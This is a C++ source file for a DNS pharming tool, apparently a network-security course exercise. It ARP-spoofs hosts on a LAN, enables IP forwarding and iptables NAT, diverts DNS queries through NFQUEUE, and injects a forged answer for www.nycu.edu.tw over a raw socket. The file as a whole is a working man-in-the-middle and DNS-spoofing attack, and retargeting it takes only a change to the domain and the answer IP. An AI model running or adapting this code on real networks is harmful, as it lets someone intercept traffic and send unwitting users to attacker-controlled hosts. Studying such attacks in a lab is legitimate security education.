#include "pharm_attack.hpp"

// #define INFO 1

/*
Handle SIGINT signal
Cleanup iptables and exit
*/
void handle_sigint(int sig) {
    system("iptables -F");
    system("iptables -F -t nat");
    system("sysctl net.ipv4.ip_forward=0 > /dev/null");
    exit(0);
}

/*
Setup IP forwarding and NAT
*/
void setup_forwarding(const char *interface) {
    char command[100];

    // Enable IP forwarding
    system("sysctl net.ipv4.ip_forward=1 > /dev/null");

    // Flush existing rules
    system("iptables -F");
    system("iptables -F -t nat");

    // Setup masquerade for outgoing packets on the specified interface
    sprintf(command, "iptables -t nat -A POSTROUTING -o %s -j MASQUERADE", interface);
    system(command);

    // Forward packets with destination port 53 to NFQUEUE
    system("iptables -A FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0");
}

// Calculate TCP checksum
uint16_t calTCPChecksum(struct iphdr *iph, struct udphdr *udph, int resp_mv) {
    // calculate udp checksum
    uint32_t sum = 0;
    // pseudo header
    sum += ntohs(iph->saddr >> 16) + ntohs(iph->saddr & 0xFFFF);
    sum += ntohs(iph->daddr >> 16) + ntohs(iph->daddr & 0xFFFF);
    sum += 0x0011;  // UDP
    sum += (resp_mv - iph->ihl * 4);
    auto buf = reinterpret_cast<const uint16_t *>(udph);
    int len_buf = (resp_mv - iph->ihl * 4) % 2 ? (resp_mv - iph->ihl * 4) / 2 + 1 : (resp_mv - iph->ihl * 4) / 2;
    for (int i = 0; i < len_buf; i++) {
        sum += ntohs(buf[i]);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return ~htons(sum);
}

// Calculate IP checksum
uint16_t calIPChecksum(struct iphdr *iph) {
    uint32_t sum = 0;
    auto buf = reinterpret_cast<const uint16_t *>(iph);
    for (int i = 0; i < iph->ihl * 2; i++) {
        sum += ntohs(buf[i] & 0xFFFF);
    }
    while (sum >> 16) {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    return ~htons(sum);
}

// Parse DNS query
std::string parseDNSQuery(const unsigned char *packet, int dns_start, int &dns_name_length) {
    std::string dns_name;
    int dns_name_position = dns_start + sizeof(dnshdr);
    dns_name_length = 5;  // Include qry.type, qry.class, and final 0 in qname

    while (packet[dns_name_position] != 0) {
        int label_length = packet[dns_name_position];
        dns_name_length += label_length + 1;

        for (int i = 0; i < label_length; i++) {
            dns_name_position++;
            dns_name += packet[dns_name_position];
        }

        dns_name_position++;
    }

    return dns_name;
}

// Send DNS reply with raw socket
void sendDNSReply(char *data, int len, struct NFQData *info) {
    int sd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_IP));
    if (sd < 0) {
        perror("socket()");
        return;
    }

    // Create a buffer for the packet
    std::vector<char> packet_buffer(1024, 0);
    struct ethhdr *eth = reinterpret_cast<struct ethhdr *>(packet_buffer.data());

    // Copy source MAC address to the packet
    std::copy(info->local_info.src_mac.begin(), info->local_info.src_mac.end(), eth->h_source);

    // Extract the destination IP from the data
    struct iphdr *iph = reinterpret_cast<struct iphdr *>(data);
    std::array<uint8_t, 4> dest_ip_array;
    memcpy(dest_ip_array.data(), &iph->daddr, 4);

    // Find the destination MAC address and copy it to the packet
    auto it = info->ip_mac_pairs.find(dest_ip_array);
    if (it != info->ip_mac_pairs.end()) {
        std::copy(it->second.begin(), it->second.end(), eth->h_dest);
    } else {
        printf("Destination IP: %d.%d.%d.%d not found in map\n", dest_ip_array[0], dest_ip_array[1], dest_ip_array[2], dest_ip_array[3]);
        return;
    }

    // Set the protocol field in the Ethernet header
    eth->h_proto = htons(ETH_P_IP);

    // Copy the rest of the packet data
    std::copy(data, data + len, packet_buffer.begin() + ETH2_HEADER_LEN);

    if (bind(sd, (struct sockaddr *)&info->local_info.device, sizeof(struct sockaddr_ll)) < 0) {
        perror("bind");
    }

    if (sendto(sd, packet_buffer.data(), len + ETH2_HEADER_LEN, 0, (struct sockaddr *)&info->local_info.device, sizeof(struct sockaddr_ll)) < 0) {
        perror("sendto()");
    }
    close(sd);

    return;
}

static int handleNFQPacket(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg,
                           struct nfq_data *nfa, void *data) {
    struct nfqnl_msg_packet_hdr *ph;
    struct nfqnl_msg_packet_hw *hwph;
    u_int32_t id = 0;
    struct NFQData *nfq_data = (struct NFQData *)data;

    ph = nfq_get_msg_packet_hdr(nfa);
    if (ph) {
        id = ntohl(ph->packet_id);
    }
    unsigned char *packet;
    int len = nfq_get_payload(nfa, &packet);
    if (len < 0) {
        printf("Error: nfq_get_payload returned %d\n", len);
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }

    // Determine the size of the new content
    int new_content_size = sizeof(struct resphdr) + 4;  // Size of resphdr and IP address

    // Allocate memory for the copied packet and the new content
    unsigned char *packet_copy = (unsigned char *)malloc(len + new_content_size);
    memcpy(packet_copy, packet, len);

    // ip header
    struct iphdr *iph = (struct iphdr *)packet_copy;
    // udp header
    struct udphdr *udph = (struct udphdr *)(packet_copy + iph->ihl * 4);

    int iph_len = iph->ihl * 4;
    int udph_len = sizeof(struct udphdr);

    if (ntohs(udph->dest) != 53 || iph->protocol != IPPROTO_UDP) {
        free(packet_copy);
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }
    int dns_name_length;
    std::string dns_name = parseDNSQuery(packet_copy, iph_len + udph_len, dns_name_length);

    if (dns_name != "wwwnycuedutw") {
        free(packet_copy);
        return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
    }

    // Start to modify the packet
    // Change the source and destination IP
    uint32_t temp = iph->daddr;
    iph->daddr = iph->saddr;
    iph->saddr = temp;

    // Change the source and destination port
    udph->dest = udph->source;
    udph->source = htons(53);

    // Define the DNS response header
    const uint16_t DNS_RESPONSE_FLAGS = 0x8180;       // DNS response flags
    const uint16_t DNS_ANSWER_COUNT = 1;              // One answer only (140.113.24.241)
    const uint16_t COMPRESSED_NAME = 0xc00c;          // Compressed name
    const uint16_t A_RECORD = 1;                      // This is an A record
    const uint16_t CLASS_IN = 1;                      // Class is IN (Internet)
    const uint32_t TTL = 5;                           // TTL is 5 seconds
    const uint16_t IP_LENGTH = 4;                     // The answer IP is 4 bytes long
    const uint8_t ANSWER_IP[] = {140, 113, 24, 241};  // The answer IP

    // Modify the DNS header
    struct dnshdr *dnsh = (struct dnshdr *)(packet_copy + iph_len + udph_len);
    dnsh->flags = htons(DNS_RESPONSE_FLAGS);
    dnsh->ans_cnt = htons(DNS_ANSWER_COUNT);
    dnsh->authrr_cnt = htons(0);
    dnsh->addrr_cnt = htons(0);

    // Add the response header at the calculated position
    struct resphdr *resp = (struct resphdr *)(packet_copy + iph_len + udph_len + sizeof(struct dnshdr) + dns_name_length);
    resp->name = htons(COMPRESSED_NAME);
    resp->type = htons(A_RECORD);
    resp->cls = htons(CLASS_IN);
    resp->ttl = htonl(TTL);
    resp->len = htons(IP_LENGTH);

    // Add the answer IP at the end of the response header
    memcpy((uint8_t *)(resp + 1), ANSWER_IP, sizeof(ANSWER_IP));

    udph->len = htons(len + new_content_size - iph_len);
    udph->check = 0;
    udph->check = calTCPChecksum(iph, udph, len + new_content_size);

    iph->tot_len = htons(len + new_content_size);
    iph->check = 0;
    iph->check = calIPChecksum(iph);

    sendDNSReply((char *)packet_copy, len + new_content_size, nfq_data);

    free(packet_copy);
    return nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
}

void NFQHandler(struct LocalInfo local_info, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs) {
    struct nfq_handle *h;
    struct nfq_q_handle *qh;
    struct nfnl_handle *nh;
    int sd;
    int rv;
    char buf[4096] __attribute__((aligned));

    struct NFQData nfq_data;
    nfq_data.local_info = local_info;
    nfq_data.ip_mac_pairs = ip_mac_pairs;

    h = nfq_open();
    if (!h) {
        fprintf(stderr, "error during nfq_open()\n");
        exit(1);
    }
    if (nfq_unbind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_unbind_pf()\n");
        exit(1);
    }
    if (nfq_bind_pf(h, AF_INET) < 0) {
        fprintf(stderr, "error during nfq_bind_pf()\n");
        exit(1);
    }
    qh = nfq_create_queue(h, 0, &handleNFQPacket, &nfq_data);
    if (!qh) {
        fprintf(stderr, "error during nfq_create_queue()\n");
        exit(1);
    }
    if (nfq_set_mode(qh, NFQNL_COPY_PACKET, 0xffff) < 0) {
        fprintf(stderr, "can't set packet_copy mode\n");
        exit(1);
    }
    sd = nfq_fd(h);
    while ((rv = recv(sd, buf, sizeof(buf), 0)) && rv >= 0) {
        nfq_handle_packet(h, buf, rv);
    }
    nfq_destroy_queue(qh);
    nfq_close(h);
}

int main(int argc, char **argv) {
    char *interface;
    struct ifreq ifr;
    int sd;

    struct LocalInfo local_info;

    if (argc != 2) {
        printf("Usage: %s <interface>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    // Interface to send packet through.
    interface = argv[1];

    // Get source IP address.
    getSourceIP(interface, local_info.src_ip);

    // Get source MAC address.
    getMACAddress(interface, local_info.src_mac);

    // Get netmask.
    getMask(interface, local_info.netmask);

    // Get default gateway.
    getDefaultGateway(interface, local_info.gateway_ip);

    // Find interface index from interface name and store index in
    // struct sockaddr_ll device, which will be used as an argument of sendto().
    if ((local_info.device.sll_ifindex = if_nametoindex(interface)) == 0) {
        perror("if_nametoindex() failed to obtain interface index");
        exit(EXIT_FAILURE);
    }
    local_info.device.sll_family = AF_PACKET;
    local_info.device.sll_protocol = htons(ETH_P_IP);
    local_info.device.sll_hatype = htons(ARPHRD_ETHER);
    local_info.device.sll_pkttype = (PACKET_BROADCAST);
    local_info.device.sll_halen = 6;  // ethernet header length
    local_info.device.sll_addr[6] = 0x00;
    local_info.device.sll_addr[7] = 0x00;
    memcpy(local_info.device.sll_addr, local_info.src_mac.data(), 6);
#ifdef INFO
    printf("src_ip: %s\n", inet_ntoa(local_info.src_ip.sin_addr));
    printf("src_mac: %02x:%02x:%02x:%02x:%02x:%02x\n", local_info.src_mac[0], local_info.src_mac[1], local_info.src_mac[2], local_info.src_mac[3], local_info.src_mac[4], local_info.src_mac[5]);
    printf("netmask: %s\n", inet_ntoa(local_info.netmask.sin_addr));
    printf("Index for interface %s is %i\n", interface, local_info.device.sll_ifindex);
    printf("gateway_ip: %s\n", inet_ntoa(local_info.gateway_ip.sin_addr));
#endif

    // Submit request for a raw socket descriptor.
    if ((sd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0) {
        perror("socket() failed");
        exit(EXIT_FAILURE);
    }

    sendARPRequest(sd, local_info);

    // Use a table to save IP-MAC pairs
    std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;

    printf("Available devices\n");
    printf("-----------------------------------------\n");
    printf("IP\t\t\tMAC\n");
    printf("-----------------------------------------\n");

    // Start the threads
    std::thread send_thread(sendSpoofedARPReply, sd, std::ref(ip_mac_pairs), local_info);
    std::thread receive_thread(receiveARPReply, sd, std::ref(ip_mac_pairs), local_info);

    signal(SIGINT, handle_sigint);

    // Setup IP forwarding
    setup_forwarding(interface);

    // Start the NFQHandler
    NFQHandler(local_info, ip_mac_pairs);

    // Wait for threads to finish
    send_thread.join();
    receive_thread.join();

    // Close socket descriptor.
    close(sd);

    return (EXIT_SUCCESS);
}